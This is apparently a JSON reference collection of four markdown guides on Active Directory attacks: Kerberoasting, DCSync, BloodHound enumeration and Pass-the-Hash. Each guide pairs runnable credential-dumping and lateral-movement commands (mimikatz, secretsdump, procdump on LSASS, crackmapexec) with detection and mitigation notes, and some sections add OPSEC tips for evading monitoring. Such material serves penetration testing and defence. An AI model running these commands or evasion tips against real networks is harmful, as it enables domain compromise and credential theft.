{
  "id": -1,
  "title": "active_directory_exploitation_testing",
  "documents": [
    {
      "name": "Kerberoasting Attack",
      "content": "# Kerberoasting Attack\n\nKerberoasting is an attack technique that targets Kerberos service accounts in Active Directory environments. It allows an attacker to request service tickets for any service with a registered SPN (Service Principal Name) and crack them offline to recover the service account password.\n\n## Prerequisites\n\n- Valid domain user credentials\n- Network access to the domain\n\n## Detection Methods\n\n- Windows Event ID 4769 (A Kerberos service ticket was requested)\n- Unusual number of 4769 events with encryption type 0x17 (RC4-HMAC)\n- TGS requests for multiple services from a single user account\n\n## Execution Steps\n\n### PowerView Method\n\n```powershell\n# Load PowerView\nImport-Module .\\PowerView.ps1\n\n# Find all user accounts with SPNs\nGet-DomainUser -SPN | select samaccountname,serviceprincipalname\n\n# Request TGS tickets\nGet-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat\n```\n\n### Built-in Windows Tools Method\n\n```powershell\n# Find SPNs associated with user accounts\nsetspn -q */*\n\n# Use Rubeus to request and extract tickets\n.\\Rubeus.exe kerberoast /outfile:hashes.txt\n```\n\n### Impacket Method (from Linux)\n\n```bash\n# Find SPNs and request tickets\npython GetUserSPNs.py -dc-ip 192.168.1.10 domain.local/username:password -outputfile hashes.txt\n```\n\n## Cracking the Tickets\n\n```bash\n# Using Hashcat\nhashcat -m 13100 -a 0 hashes.txt wordlist.txt --force\n```\n\n## Mitigation Strategies\n\n- Use strong, complex passwords (>25 characters) for service accounts\n- Implement AES encryption (AES256_HMAC) instead of RC4_HMAC\n- Apply time-based Group Managed Service Accounts (gMSA) where possible\n- Monitor for Event ID 4769 with encryption type 0x17 (RC4-HMAC)\n- Implement a tiered administration model to limit exposure of privileged accounts",
      "topics": [
        "active-directory",
        "credential-access",
        "kerberos",
        "lateral-movement",
        "privilege-escalation"
      ],
      "source_type": "markdown",
      "metadata": {
        "source_type": "markdown"
      }
    },
    {
      "name": "DCSync Attack",
      "content": "# DCSync Attack\n\nThe DCSync attack mimics the behavior of a domain controller and requests account password data from the targeted domain controller. This technique leverages the Directory Replication Service Remote Protocol (MS-DRSR) to retrieve password hashes for domain accounts.\n\n## Prerequisites\n\n- Domain user with DCSync privileges (typically Domain Admins, Administrators, or Enterprise Admins)\n- Network access to a domain controller\n\n## Required Permissions\n\nTo perform DCSync, an account needs the following rights on the domain object:\n- DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)\n- DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n- DS-Replication-Get-Changes-In-Filtered-Set (GUID: 89e95b76-444d-4c62-991a-0facbeda640c)\n\n## Detection Methods\n\n- Windows Event ID 4662 (An operation was performed on an object)\n- Replication requests from non-domain controllers\n- SECURITY logs with appropriate GUID accesses\n\n## Execution Steps\n\n### Using Mimikatz\n\n```powershell\n# Launch mimikatz with elevated privileges\n\n# Extract NTLM hash for a specific user\nlsadump::dcsync /domain:domain.local /user:Administrator\n\n# Extract NTLM hashes for all domain users\nlsadump::dcsync /domain:domain.local /all\n```\n\n### Using Empire/PowerShell\n\n```powershell\n# Using PowerView and Invoke-Mimikatz\nAdd-DomainObjectAcl -TargetIdentity \"DC=domain,DC=local\" -PrincipalIdentity attacker -Rights DCSync\nInvoke-Mimikatz -Command '\"lsadump::dcsync /domain:domain.local /user:Administrator\"'\n```\n\n### Using Impacket (from Linux)\n\n```bash\n# Extract hash for a specific user\npython secretsdump.py domain.local/user:password@192.168.1.10 -just-dc-user Administrator\n\n# Extract all domain hashes\npython secretsdump.py domain.local/user:password@192.168.1.10 -just-dc-ntlm\n```\n\n## OPSEC Considerations\n\n- DCSync generates specific event logs that are easily identifiable\n- Use accounts that already have replication rights to avoid modifying ACLs\n- Conduct the attack during normal business hours when replication traffic is expected\n- Target domain controllers that have less monitoring if possible\n\n## Mitigation Strategies\n\n- Monitor for Event ID 4662 with the specific GUIDs related to replication\n- Restrict and monitor accounts with replication permissions\n- Implement Protected Users security group for privileged accounts\n- Use Advanced Threat Analytics (ATA) or similar tools to detect abnormal replication requests\n- Regular security review of accounts with sensitive privileges",
      "topics": [
        "active-directory",
        "credential-access",
        "lateral-movement",
        "domain-controllers"
      ],
      "source_type": "markdown",
      "metadata": {
        "source_type": "markdown"
      }
    },
    {
      "name": "BloodHound for Active Directory Enumeration",
      "content": "# BloodHound for Active Directory Enumeration\n\nBloodHound is an Active Directory reconnaissance tool that uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. BloodHound can quickly identify complex attack paths that would otherwise be impossible to identify manually.\n\n## Components\n\n- **Collectors (Ingestors)**: Data collection tools that gather information from Active Directory\n- **Neo4j Database**: Graph database that stores and processes the collected data\n- **BloodHound UI**: Frontend interface for visualizing and querying the data\n\n## Available Collectors\n\n- **SharpHound (C#)**: Main Windows-based collector\n- **BloodHound.py (Python)**: Cross-platform alternative collector\n- **AzureHound (PowerShell)**: Azure/M365 data collector\n\n## Data Collection Methods\n\n### Using SharpHound\n\n```powershell\n# Import the SharpHound module\nImport-Module .\\SharpHound.ps1\n\n# Basic collection with default methods\nInvoke-BloodHound -CollectionMethod All -OutputDirectory C:\\BloodHound\n\n# Stealth collection (reduces noise)\nInvoke-BloodHound -CollectionMethod DCOnly,Session,LoggedOn -NoSaveCache -RandomFilenames -EncryptZip\n\n# From SharpHound.exe\n.\\SharpHound.exe --CollectionMethod All --OutputDirectory C:\\BloodHound\n```\n\n### Using BloodHound.py (from Linux)\n\n```bash\n# Basic collection\npython bloodhound.py -c All -u username -p password -d domain.local\n\n# With LDAP connection\npython bloodhound.py -c All -u username -p password -d domain.local --dns-tcp -dc dc01.domain.local\n```\n\n## OPSEC Considerations\n\n- SharpHound creates network noise through LDAP, DCE/RPC, and SMB traffic\n- Data collection creates log entries on domain controllers (Event IDs 4662, 4672, 4768, etc.)\n- SharpHound.exe may be flagged by antivirus or EDR solutions\n- Running with domain admin privileges may trigger alerts for privileged account misuse\n\n## Low-Noise Collection Strategies\n\n- Use the **DCOnly** collection method to reduce endpoint enumeration\n- Leverage **Session** method during business hours when authentication traffic is normal\n- Employ staggered collection over multiple days\n- Run from multiple machines with different non-privileged accounts\n- Use the `-SteathSource` parameter to limit source systems in session collection\n\n## Useful BloodHound Queries\n\n- **Find all Domain Admins**: `MATCH (n:User) WHERE n.admincount=True RETURN n`\n- **Find Shortest Path to Domain Admins**: `MATCH (n:Computer),(m:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}),p=shortestPath((n)-[*1..]->(m)) RETURN p`\n- **Find Kerberoastable Users**: `MATCH (n:User) WHERE n.hasspn=true RETURN n`\n\n## Defensive Measures\n\n- Monitor for SharpHound-specific User Agent strings in LDAP queries\n- Detect excessive LDAP queries, especially those enumerating privileged groups\n- Look for abnormal patterns of SAMR, LDAP, and Kerberos requests from non-administrative systems\n- Monitor for `.zip` files with BloodHound-related names\n- Implement network segmentation to limit lateral movement capabilities\n- Use privileged access workstations (PAWs) for administrative activities\n- Regularly audit and remove excessive rights in the directory",
      "topics": [
        "active-directory",
        "reconnaissance",
        "enumeration",
        "bloodhound"
      ],
      "source_type": "markdown",
      "metadata": {
        "source_type": "markdown"
      }
    },
    {
      "name": "Pass-the-Hash Attack",
      "content": "# Pass-the-Hash Attack\n\nPass-the-Hash (PtH) is a technique that allows an attacker to authenticate to a remote system or service using the NTLM hash of a user's password instead of the actual password. This attack exploits the NTLM authentication protocol's design where the hash itself is used for authentication.\n\n## Prerequisites\n\n- NTLM hash of a valid user account\n- Network connectivity to the target system\n- Target system must accept NTLM authentication\n\n## Detection Methods\n\n- Windows Event ID 4624 (Successful Logon) with Logon Type 3 and unusual source systems\n- Event ID 4625 (Failed Logon) patterns indicating brute force attempts\n- Authentication from a system where the user has not logged on interactively\n- Multiple logons from the same account coming from different systems in a short timeframe\n\n## Execution Steps\n\n### Using Mimikatz\n\n```powershell\n# Launch Mimikatz with elevated privileges\n\n# Pass-the-Hash using Mimikatz\nsekurlsa::pth /user:Administrator /domain:domain.local /ntlm:e2b475c11da2a0748290d87aa966c327 /run:cmd.exe\n```\n\n### Using Impacket (from Linux)\n\n```bash\n# Using PsExec\npython psexec.py -hashes :e2b475c11da2a0748290d87aa966c327 domain.local/Administrator@192.168.1.10\n\n# Using WMIExec\npython wmiexec.py -hashes :e2b475c11da2a0748290d87aa966c327 domain.local/Administrator@192.168.1.10\n\n# Using SMBExec\npython smbexec.py -hashes :e2b475c11da2a0748290d87aa966c327 domain.local/Administrator@192.168.1.10\n```\n\n### Using CrackMapExec (from Linux)\n\n```bash\n# Test authentication across multiple systems\ncrackmapexec smb 192.168.1.0/24 -u Administrator -H e2b475c11da2a0748290d87aa966c327\n\n# Execute commands\ncrackmapexec smb 192.168.1.10 -u Administrator -H e2b475c11da2a0748290d87aa966c327 -x \"whoami\"\n```\n\n## Obtaining NTLM Hashes\n\n### Local SAM Database\n\n```powershell\n# Using Mimikatz\nlsadump::sam\n\n# Using reg.exe and offline extraction\nreg save HKLM\\SAM sam.save\nreg save HKLM\\SYSTEM system.save\n# Then extract with secretsdump.py or similar tools\n```\n\n### LSASS Memory\n\n```powershell\n# Using Mimikatz\nsekurlsa::logonpasswords\n\n# Using procdump and offline extraction\nprocdump.exe -ma lsass.exe lsass.dmp\n# Then extract with Mimikatz: sekurlsa::minidump lsass.dmp followed by sekurlsa::logonpasswords\n```\n\n## OPSEC Considerations\n\n- NTLM authentication generates event logs\n- Unusual lateral movement patterns may trigger alerts\n- Many security tools specifically monitor for Pass-the-Hash attacks\n- Using privileged accounts may generate additional alerts\n\n## Mitigation Strategies\n\n- Implement the Protected Users security group for privileged accounts\n- Enable Windows Credential Guard to prevent credential harvesting\n- Use Restricted Admin mode for Remote Desktop connections\n- Implement Local Administrator Password Solution (LAPS)\n- Segment networks and implement tiered administration\n- Require multi-factor authentication for sensitive systems\n- Monitor for unusual authentication patterns and lateral movement\n- Disable NTLM authentication where possible and use Kerberos",
      "topics": [
        "active-directory",
        "credential-access",
        "lateral-movement",
        "ntlm",
        "authentication"
      ],
      "source_type": "markdown",
      "metadata": {
        "source_type": "markdown"
      }
    }
  ],
  "topics": [
    "ntlm",
    "lateral-movement",
    "credential-access",
    "domain-controllers",
    "authentication",
    "reconnaissance",
    "bloodhound",
    "enumeration",
    "privilege-escalation",
    "active-directory",
    "kerberos"
  ]
}
